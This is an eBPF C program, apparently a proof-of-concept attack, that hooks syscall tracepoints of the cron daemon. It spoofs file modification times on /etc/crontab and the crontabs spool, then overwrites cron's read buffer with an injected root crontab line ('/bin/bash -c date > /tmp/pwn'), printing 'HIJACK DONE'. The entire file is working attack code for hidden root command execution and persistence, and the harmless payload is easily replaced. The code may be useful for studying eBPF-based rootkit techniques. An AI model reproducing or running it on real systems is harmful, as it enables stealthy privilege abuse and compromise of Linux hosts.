// SPDX-License-Identifier: GPL-2.0 OR BSD-3-Clause
/* Copyright (c) 2020 Facebook */

#define BPF_NO_PRESERVE_ACCESS_INDEX
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_tracing.h>


#define MISS 0
#define HIT 1
#define SPOOL_DIR	"crontabs"
#define CRONTAB	"/etc/crontab"
#define SYSCRONTAB "/etc/crontab"
#define TASK_COMM_LEN			16
#define SKIP_OFFSET 0x2bb
//#define PAYLOAD "* * * * * root /bin/bash -c \'date > /tmp/pwn\' #"



/* Global Var */
int my_pid = 0;
int cron_pid = 0;
char filename_saved[65]={0};
char openat_filename_saved[0x40]={0};
void* read_buf_ptr = NULL;
struct stat * statbuf_ptr=NULL;
struct stat * statbuf_fstat_ptr=NULL;
int open_fd=0;
char PAYLOAD[]  = "* * * * * root /bin/bash -c 'date > /tmp/pwn' \n #";
int read_fd=0;
int jump_flag = 0;
char string_fmt[] = "\n%s\n";

/* ****************************** Deceleration Begin ****************************** */
/* Another Helpers */
static __inline int memcmp(const void* s1, const void* s2, size_t cnt);
static __inline void *memcpy(void* dest, const void* src, size_t count);
/* Enter Operation */
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx);



/* Exit Hook Operation */
static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx);
static __inline int handle_exit_stat();
static __inline int handle_exit_fstat();
static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx);
/* ****************************** Deceleration Over ****************************** */


/* ****************************** Implement Begin ****************************** */

static __inline int memcmp(const void* s1, const void* s2, size_t cnt){

  const char *t1 = s1;
  const char *t2 = s2;

  int res = 0;
  while(cnt-- > 0){
    if(*t1 > *t2){
      res =1;
      break;
    }
    else if(*t1 < *t2){
      res = -1;
      break;
    }
    else{
      t1++;
      t2++;
    }
  }

  return res;
}
static __inline void *memcpy(void* dest, const void* src, size_t count)
{


       char* pdest =(char*) dest;

       const char* psrc =(const char*) src;

       if (psrc > pdest || pdest >= psrc + count)

       {

              while (count--)

              *pdest++ = *psrc++;

       }

       else

       {

               while (count--)

               {

                     *(pdest + count) = *(psrc + count);

              }

       }

return dest;

}

// read(int fd, void *buf, size_t count);
static __inline int handle_enter_read(struct bpf_raw_tracepoint_args *ctx){
  int pid=0;
  pid = bpf_get_current_pid_tgid() & 0xffffffff;
  if(pid!=cron_pid){
    return 0;
  }
  struct pt_regs *regs;
	char buf[0x40];
	char *pathname ;
  int fd=0;
  regs = (struct pt_regs *)(ctx->args[0]);
  fd = PT_REGS_PARM1_CORE(regs);
  read_buf_ptr = (void *)PT_REGS_PARM2_CORE(regs);
  if(fd != open_fd){
    jump_flag = MISS;
    return 0;
  }
  jump_flag = HIT;
  
  
  bpf_printk("[sys_enter::handle_enter_read] fd is %d\n",fd);
  bpf_printk("[sys_enter::handle_enter_read] read_buf is : 0x%lx\n",read_buf_ptr);
  return 0;
}


static __inline int handle_enter_close(struct bpf_raw_tracepoint_args *ctx){

  bpf_printk("[sys_enter::handle_enter_close] close()\n");
  return 0;
}
/*

https://lore.kernel.org/bpf/20200313172336.1879637-4-andriin@fb.com/
https://github.com/time-river/Linux-eBPF-Learning/tree/main/4-CO-RE
https://vvl.me/2021/02/eBPF-2-example-openat2/

*/
static __inline int handle_enter_stat(struct bpf_raw_tracepoint_args *ctx){
  struct pt_regs *regs;
	char buf[0x40];
	char *pathname ;

	regs = (struct pt_regs *)(ctx->args[0]);

  // Read the correspoding string which ends at NULL
  pathname = (char *)PT_REGS_PARM1_CORE(regs);
  bpf_probe_read_str(buf,sizeof(buf),pathname);
   // Check if the file is "/etc/crontab" or "crontabs"
  if(memcmp(buf , CRONTAB , sizeof(CRONTAB)) && memcmp(buf,SPOOL_DIR,sizeof(SPOOL_DIR))){
		return 0;
  }
  if(cron_pid == 0){
		cron_pid = bpf_get_current_pid_tgid() & 0xffffffff;
    //bpf_printk("New cron_pid: %d\n",cron_pid);
	}

  memcpy(filename_saved , buf , 64);
  bpf_printk("[sys_enter::handle_enter_stat()] New filename_saved: %s\n",filename_saved);
  
  //bpf_printk("%lx\n",PT_REGS_PARM2(regs));
  // Read the file's state address, saved into statbuf_ptr from regs->rsi
  statbuf_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);
  //bpf_probe_read_kernel(&statbuf_ptr , sizeof(statbuf_ptr) , PT_REGS_PARM2(regs));
  
  return 0;
}

// int fstat(int fd, struct stat *statbuf);
static __inline int handle_enter_fstat(struct bpf_raw_tracepoint_args *ctx){


  struct pt_regs *regs;
	char buf[0x40];
	char *pathname ;
  int fd=0;

	regs = (struct pt_regs *)(ctx->args[0]);
  fd = PT_REGS_PARM1_CORE(regs);
  if(fd != open_fd){
    return 0;
  }

  bpf_printk("[sys_enter::handle_enter_fstat] We Got fd: %d\n",fd);
  statbuf_fstat_ptr = (struct stat *)PT_REGS_PARM2_CORE(regs);
  return 0;
}

// int openat(int  dirfd , const char * pathname
static __inline int handle_enter_openat(struct bpf_raw_tracepoint_args *ctx) {
  struct pt_regs *regs;
	char buf[0x40];
	char *pathname ;

	regs = (struct pt_regs *)(ctx->args[0]);
  pathname = (char *)PT_REGS_PARM2_CORE(regs);
  bpf_probe_read_str(buf,sizeof(buf),pathname);

   // Check if open SYSCRONTAB
  if(memcmp(buf , SYSCRONTAB , sizeof(SYSCRONTAB))){
		return 0;
  }
  bpf_printk("[sys_enter::handle_enter_openat] We Got it: %s\n",buf);

  // Save to openat_filename_saved
  memcpy(openat_filename_saved , buf , 64);
  return 0;
}


/* ****************************** Implement Over ****************************** */


#define TARGET_NAME "cron"
SEC("raw_tracepoint/sys_enter")
int raw_tp_sys_enter(struct bpf_raw_tracepoint_args *ctx)
{
    unsigned long syscall_id = ctx->args[1];
    char comm[TASK_COMM_LEN];
    bpf_get_current_comm(&comm, sizeof(comm));
    // executable is not cron, return
    if (memcmp(comm, TARGET_NAME, sizeof(TARGET_NAME))){
        return 0;
    }

    //bpf_printk("cron trigger!\n");
    switch (syscall_id)
    {
        case 0:
            handle_enter_read(ctx);
            break;
        case 3:  // close
            handle_enter_close(ctx);
            break;
        case 4:
            handle_enter_stat(ctx);
            break;
        case 5:
            handle_enter_fstat(ctx);
            break;
        case 257:
            handle_enter_openat(ctx);
            break;
        default:
            //bpf_printk("None of targets , break");
            return 0;
    }
    return 0;
}

SEC("raw_tracepoint/sys_exit")
int raw_tp_sys_exit(struct bpf_raw_tracepoint_args *ctx)
{
  unsigned int id=0;
  struct pt_regs *regs;
  if (cron_pid == 0)
        return 0;
    int pid = bpf_get_current_pid_tgid() & 0xffffffff;
    if (pid != cron_pid)
        return 0;
  
  //bpf_printk("Hit pid: %d\n",pid);
  regs = (struct pt_regs *)(ctx->args[0]);
  // Read syscall_id from orig_ax
  //bpf_probe_read_kernel(&id, sizeof(id), regs->orig_ax);
  id = BPF_CORE_READ(regs,orig_ax);
  switch (id)
    {
        case 0:
            handle_exit_read(ctx);
            break;
        case 4:
            handle_exit_stat();
            break;
        case 5:
            handle_exit_fstat();
            break;
        case 257:
            handle_exit_openat(ctx);
            break;
        default:
            return 0;
    }

  return 0;
}


static __inline int handle_exit_stat(){
  if(statbuf_ptr == 0){
    return 0;
  }
  bpf_printk("[sys_exit::handle_exit_stat()] cron %d stat() %s\n",cron_pid , filename_saved);
  /*
  
  At this point, we need to make sure that the following two conditions are both passed.
  Which is equivalent to :

  !TEQUAL(old_db->mtim, TMAX(statbuf.st_mtim, syscron_stat.st_mtim))    [1]
  !TEQUAL(syscron_stat.st_mtim, ts_zero)                                [2]

  */

 // We are tend to set statbuf.st_mtim ZERO and set syscron_stat.st_mtim a SMALL RANDOM VALUE
  __kernel_ulong_t spool_dir_st_mtime = 0;
  __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;  //bpf_get_prandom_u32 Returns a pseudo-random u32.

  // Ensure the file is our target

  // If we are checking SPOOL_DIR
  if(!memcmp(filename_saved , SPOOL_DIR , sizeof(SPOOL_DIR))){
    bpf_probe_write_user(&statbuf_ptr->st_mtime , &spool_dir_st_mtime , sizeof(spool_dir_st_mtime) );
  }
  if(!memcmp(filename_saved , CRONTAB , sizeof(CRONTAB))){
    bpf_probe_write_user(&statbuf_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));
  }
  bpf_printk("[sys_exit::handle_exit_stat()]  Modify DONE\n");
  // update
  statbuf_ptr = 0;

  return 0;
}

static __inline int handle_exit_read(struct bpf_raw_tracepoint_args *ctx){
  if(jump_flag == MISS){
    return 0;
  }
  int pid=0;
  pid = bpf_get_current_pid_tgid() & 0xffffffff;
  if(pid!=cron_pid){
    return 0;
  }

  if(read_buf_ptr == 0){
    return 0;
  }
  ssize_t ret = ctx->args[1];
  if (ret <= 0)
    {
        read_buf_ptr  = 0;
        bpf_printk("[sys_exut::handle_exit_read] read failed!\n");
        return 0;
    }
  bpf_printk("[sys_exut::handle_exit_read] your read length: 0x%lx\n",ret);
  if (ret < sizeof(PAYLOAD))
    {
        bpf_printk("PAYLOAD too long\n");

        read_buf_ptr = 0;
        return 0;
    }
  
  bpf_printk("[sys_exut::handle_exit_read] target write addr: 0x%lx\n",read_buf_ptr);

  //bpf_printk("%s\n",(char *)(read_buf_ptr+0x2bb));
  bpf_probe_write_user((char *)(read_buf_ptr), PAYLOAD, sizeof(PAYLOAD));
  bpf_printk("[sys_exut::handle_exit_read] sizeof PAYLOAD(%d) ; HIJACK DONE!\n",sizeof(PAYLOAD));
  read_buf_ptr = 0;
  jump_flag = MISS;
  return 0;
}
static __inline int handle_exit_fstat(){
  
  if(open_fd == 0){
    return 0;
  }
  if(statbuf_fstat_ptr == 0){
    return 0;
  }

  __kernel_ulong_t crontab_st_mtime = bpf_get_prandom_u32() & 0xffff;

  // bpf_printk("[sys_exit::handle_exit_fstat]: HIT!\n");
 

  bpf_probe_write_user(&statbuf_fstat_ptr->st_mtime , &crontab_st_mtime ,sizeof(crontab_st_mtime));

  bpf_printk("[sys_exit::handle_exit_fstat()]  Modify DONE\n");


  //open_fd = 0;

  return 0;
}

static __inline int handle_exit_openat(struct bpf_raw_tracepoint_args *ctx){
   if(openat_filename_saved[0]==0){
    return 0;
  }
  // Ensure we open SYSCROnTAB
  if(!memcmp(openat_filename_saved , SYSCRONTAB , sizeof(SYSCRONTAB)))
  {
    // save the corresponding file descriptor
    open_fd = ctx->args[1];
    bpf_printk("[sys_exit::handle_exit_openat()] openat: %s, fd: %d\n",openat_filename_saved , open_fd);
    openat_filename_saved[0] = '\0';
  }
  return 0;
}
char LICENSE[] SEC("license") = "Dual BSD/GPL";